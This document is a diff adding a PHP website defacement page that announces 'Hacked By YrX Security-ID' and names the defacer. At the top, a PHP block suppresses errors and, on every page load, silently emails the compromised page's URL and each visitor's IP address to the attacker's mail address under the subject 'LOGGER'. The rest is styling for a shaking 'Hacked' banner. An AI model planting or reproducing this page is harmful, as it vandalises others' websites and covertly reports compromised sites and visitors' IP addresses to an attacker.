@@ -1,0 +1,53 @@
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'yrxsec@gmail.com, yrxsec@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<title>Hacked?  By YrX :)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans+Narrow|Just+Another+Hand" rel="stylesheet"> 
+<link rel="icon" type="image/png" href="https://i.ibb.co/NmtHwkr/Yrx2.png">
+<meta content='MuH4mMad H4DyaN R4mADhAn' name='description'/>
+<center>
+<style>
+@keyframes shake {
+  0% { transform: translate(1px, 1px) rotate(0deg); }
+  10% { transform: translate(-1px, -2px) rotate(-1deg); }
+  20% { transform: translate(-3px, 0px) rotate(1deg); }
+  30% { transform: translate(3px, 2px) rotate(0deg); }
+  40% { transform: translate(1px, -1px) rotate(1deg); }
+  50% { transform: translate(-1px, 2px) rotate(-1deg); }
+  60% { transform: translate(-3px, 1px) rotate(0deg); }
+  70% { transform: translate(3px, 1px) rotate(-1deg); }
+  80% { transform: translate(-1px, -1px) rotate(1deg); }
+  90% { transform: translate(1px, 2px) rotate(0deg); }
+  100% { transform: translate(1px, -2px) rotate(-1deg); }
+}
+.x{
+	  animation: shake 1s;
+  animation-iteration-count: infinite;
+	font-family: 'Just Another Hand', cursive;
+	font-size:58px;
+}
+.z{
+	font-family: 'PT Sans Narrow', cursive;
+	font-size:20px;
+}
+</style>
+<body bgcolor='black'><font color='white'><pre>
+
+</pre>
+<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png" height="300" width="300">
+<div class=x>Hacked By YrX Security-ID  &#x1F494;</div><br>
+<div class=z>
+<br>   
+Defaced By <br>
+[ MuH4mMad H4DyaN R4mADhAn ]
+</div>
+
